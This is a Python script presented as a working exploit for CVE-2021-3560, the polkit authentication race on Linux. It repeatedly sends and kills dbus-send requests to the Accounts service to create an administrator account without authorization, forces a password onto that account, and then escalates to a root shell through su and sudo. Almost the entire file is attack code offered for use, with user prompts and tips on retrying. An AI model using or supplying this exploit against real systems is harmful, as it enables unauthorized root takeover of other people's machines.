import subprocess
import time
import random
import pwd

print ('#############################')
print('EXPLOIT FOR CVE-2021-3560 :3')
print ('#############################')

print('note: '
      '[1] This code is not perfect. the first main loop needs revisioning.\n'
      'if it takes too much time, just kill it and try again.\n'
      '[2] if you choose to use a passwd for your new user, \n'
      'just know that it could take some tries, make a new user if\n'
      'authentication does not work'
    )
print ("\n-------------------------------")
name = input("Enter name of new user: ")
print ("-------------------------------")
complete_name = input("Enter complete name of new user: ")
print ("-------------------------------")

check_name_command =  ('id', name)
check_name_completed = subprocess.run(check_name_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
output = check_name_completed.stdout
print (output)

while check_name_completed.returncode != 0:
    killtime = 0.0001
    for i in range(1, 600):
        check_name_command =  ('id', name)
        check_name_completed = subprocess.run(check_name_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        check_name_output = check_name_completed.stdout
        if check_name_completed.returncode != 0:
            command2 = [
                'dbus-send', 
                '--system',
                '--dest=org.freedesktop.Accounts',
                '--type=method_call',
                '--print-reply=literal',  # Specify 'literal' for --print-reply
                '/org/freedesktop/Accounts',
                'org.freedesktop.Accounts.CreateUser',
                f'string:{name}',
                f'string:"{complete_name}"',
                'int32:1',
            ]
            try:
                subprocess.run(command2, timeout=killtime)
            except subprocess.TimeoutExpired:
                pass  
            #time.sleep(killtime)
            killtime += 0.001
            compleated_command2 = subprocess.run(command2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output2 = compleated_command2.stdout
            error2 = compleated_command2.stderr
            print('forcing user....')

            
        else:
            break
print ("User forced correctly!!!")
print (check_name_output)

passbool = input('Would you like to setup a password for '+ name+ ' ? [y/n]') 
if passbool == 'y':
    passw = input('Enter password for '+ name + ': ')
print ('#############################')
print('Forcing password into '+ name)
print ('#############################')


#i took ispiration for this part from https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py, thank you!
for i in range(200):
    uid = "/org/freedesktop/Accounts/User" + str(pwd.getpwnam(name).pw_uid)

    if passbool == 'n':
        password = "string:"

        process = subprocess.Popen(['dbus-send', '--system', '--dest=org.freedesktop.Accounts', '--type=method_call', '--print-reply', uid, 'org.freedesktop.Accounts.User.SetPassword', password, 'string:GoldenEye'])
        try:
            Random = random.uniform(0.006, 0.009)
            process.wait(timeout=Random)
            process.kill()
        except subprocess.TimeoutExpired:
            process.kill()
            
    elif passbool == 'y':
        
        password = passw
        res = subprocess.run(['openssl', 'passwd','-5',password], stdout=subprocess.PIPE).stdout.decode('utf-8')
        password = f"string:{res.rstrip()}"

        process = subprocess.Popen(['dbus-send', '--system', '--dest=org.freedesktop.Accounts', '--type=method_call', '--print-reply', uid, 'org.freedesktop.Accounts.User.SetPassword', password, 'string:GoldenEye'])
        try:
            Random = random.uniform(0.006, 0.009)
            process.wait(timeout=Random)
            process.kill()
        except subprocess.TimeoutExpired:
            process.kill()

print("[+] Timed out at: " + str(Random))
print("[+] Exploit Completed, Your new user is " + name + " just log into it like, 'su john', or 'su - john' and then 'sudo su' to root :3")

if passbool == 'n':
    p = subprocess.call(f"(su {name} -c 'sudo su')", shell=True)
